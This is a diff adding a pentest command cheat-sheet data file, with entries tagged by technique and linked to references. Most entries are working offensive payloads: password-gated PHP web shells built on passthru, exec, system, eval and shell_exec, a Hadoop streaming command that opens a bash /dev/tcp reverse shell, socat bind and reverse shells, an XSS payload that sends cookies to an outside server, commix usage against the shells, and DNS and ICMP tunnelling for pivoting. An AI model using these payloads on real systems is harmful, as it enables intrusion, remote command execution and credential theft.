@@ -1,0 +1,224 @@
+<?php if (isset($_GET['Password'])){passthru($_GET['cmd']);} ?>
+Php Simple shell, set aPasswordto access, cmd is your command: See Commix to use this easily
+EOC
+web application
+remote command shell
+php
+EOT
+php.net/manual/en/function.passthru.php
+EOR
+<?php if (isset($_GET['Password'])){exec($_GET['cmd']);} ?>
+Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
+EOC
+web application
+remote command shell
+php
+EOT
+php.net/manual/en/function.exec.php
+EOR
+<?php if (isset($_GET['Password'])){system($_GET['cmd']);} ?>
+Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
+EOC
+web application
+remote command shell
+php
+EOT
+php.net/manual/en/function.system.php
+EOR
+<?php if (isset($_GET['Password'])){eval($_GET['cmd']);} ?>
+Php Simple shell, set Password to access, cmd is your command: See Commix to use this easily
+EOC
+web application
+remote command shell
+php
+EOT
+php.net/manual/en/function.eval.php
+EOR
+<?php if (isset($_GET['Password'])){shell_exec($_GET['cmd']);} ?>
+Php Simple shell, set Password to access, bis your command: See Commix to use this easily
+EOC
+web application
+remote command shell
+php
+EOT
+php.net/manual/en/function.shell-exec.php
+EOR
+X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
+EICAR Test string
+EOC
+Anti Virus
+enumeration
+EOT
+https://en.wikipedia.org/wiki/EICAR_test_file
+EOR
+./bin/hadoop jar share/hadoop/tools/lib/hadoop-streaming-2.7.3.jar -input /tmp/out/1 -output /tmp/out/NC_1 -mapper "bash -i >& /dev/tcp/[ip]/[port] 0>&1" -reducer NONE -cmdenv user.name=hdfs -cmdenv as=hdfs -verbose -mapdebug "bash -i >& /dev/tcp/[ip]/[port] 0>&1"
+Hadoop Command execution, of course replace the shell with whatever you want
+EOC
+reverse shells
+EOT
+http://seclist.us/hadoop-attack-library-is-a-collection-of-pentest-tools-and-resources-targeting-hadoop-environments.html
+EOR
+for i in $(ls -alh /data/shares/opt/ | grep "^drw" | awk '{print $9}'); do cd /data/shares/opt/$i; git pull; echo $i;done | grep -v fatal
+GitUp : Update all the opt gits
+https://yg.ht
+EOC
+GIT
+linux
+interesting
+EOT
+EOR
+hping -S -y -m 1300 -p 445 shared
+TCP ping : Check MTU
+EOC
+linux
+interesting 
+networking
+EOT
+EOR
+ping 8.8.8.8 -M do -s 1476 -f
+ICMP : Check MTU
+EOC
+linux
+interesting 
+networking
+EOT
+EOR
+https://jsfiddle.net/byf89m43/2/
+JSFiddle skele
+EOC
+web application
+XSS
+EOT
+http://stackoverflow.com/questions/17382200/print-var-in-jsfiddle
+EOR
+aws s3 ls  s3://flaws.cloud/ --no-sign-request --region us-west-2
+Check for UNauth access to bucket
+EOC
+Cloud
+web application
+EOT
+http://flaws.cloud/hint2.html
+EOR
+xfreerdp +clipboard /drive:[sharename],[path] /u:[user] /d:[domain] /p:[password ] /size:80% /v:[host]
+XfreeRDP new swtich format
+EOC
+pivoting
+linux
+RDP
+EOT
+https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface
+EOR
+<img src=127.0.0.1 onerror=this.src='http://[server]/?cookie='+document.cookie>
+Simple steal cookie
+EOC
+web application
+XSS
+EOT
+EOR
+ssh username@server -w any:any & ip addr add 100.64.1.2/32 peer 100.64.1.1 dev ; ssh root@[ip] -C 'ip addr add 100.64.1.1/32 peer 100.64.1.2 dev tun0; route add -net [destnet]/16 gw 1.1.1.1;
+Create a SSH based TAP VPN
+EOC
+bash
+linux
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+EOR
+./hans -v -f -s 100.64.1.1 -p [password]; ./hans -f -c [ip] -p [password] -v
+Hans ICMP tunnel, first cmd is server, second client
+EOC
+linux
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+http://code.gerade.org/hans/
+EOR
+iodined -f -c -P [password] 100.164.1.1 [serveraddr]; iodine -f -P [password] [serveraddr] -r
+ICMP tunnel, first cmd is server, second client
+EOC
+linux
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+http://code.kryo.se/iodine/
+EOR
+ruby ./dnscat2.rb tunneldomain.com; ./dnscat2 tunneldomain.com
+DNS tunnel, , first cmd is server, second client
+EOC
+linux
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+https://github.com/iagox86/dnscat2
+EOR
+echo "Username [user]" >> config; echo "Password [pass]" >> config; echo "Domain [domain]" >> config; echo "Proxy [proxyIP]" >> config; echo "Tunnel [lport]:[lip]:[rport]" >> config; cntlm.exe -c config.conf
+NTLM aware proxy client, proxychains
+EOC
+linux
+windows
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+http://cntlm.sourceforge.net/	
+EOR
+echo "[ProxyList]" > /etc/proxychains.conf; echo "socks4  127.0.0.1 2222" >> /etc/proxychains.conf; proxychains [program]
+Run program over socks proxy
+EOC
+linux
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+http://proxychains.sourceforge.net/
+EOR
+socat TCP-LISTEN:[lip],reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane; socat FILE:`tty`,raw,echo=0 TCP:[rip]:[rport]
+Socat BindShell, First on server, second on client
+EOC
+linux
+shells
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+EOR
+socat TCP-LISTEN:[lip],reuseaddr FILE:`tty`,raw,echo=0; socat TCP4:[rip]:[rport] EXEC:bash,pty,stderr,setsid,sigint,sane
+Socat reverse shell, First on client, second on server
+EOC
+linux
+reverse shells
+pivoting
+EOT
+https://artkond.com/2017/03/23/pivoting-guide/
+EOR
+getent passwd; getent group;
+enumerate users and groups
+EOC
+linux
+enumeration
+EOT
+https://www.unixtutorial.org/commands/getent/
+EOR
+/opt/commix/commix.py -u "https://[rip]:443/[resource]?[password]&cmd=1*" --force-ssl
+Commix abuse exec as per the php shells, nicer than burp repeater! 
+EOC
+web application
+remote command shell
+EOT
+https://github.com/commixproject/commix
+EOR
+openssl aes-256-cbc -in some_file.enc -out some_file.unenc -e -pass pass:somepassword
+OpenSSL Encypt, add -a if input is b64, 
+EOC
+encyption
+linux
+bash
+EOT
+http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
+EOR
+openssl aes-256-cbc -in some_file.enc -out some_file.unenc -d -pass pass:somepassword
+OpenSSL decrypt, add -a if input is b64, 
+EOC
+encyption
+linux
+bash
+EOT
+http://tombuntu.com/index.php/2007/12/12/simple-file-encryption-with-openssl/
+EOR
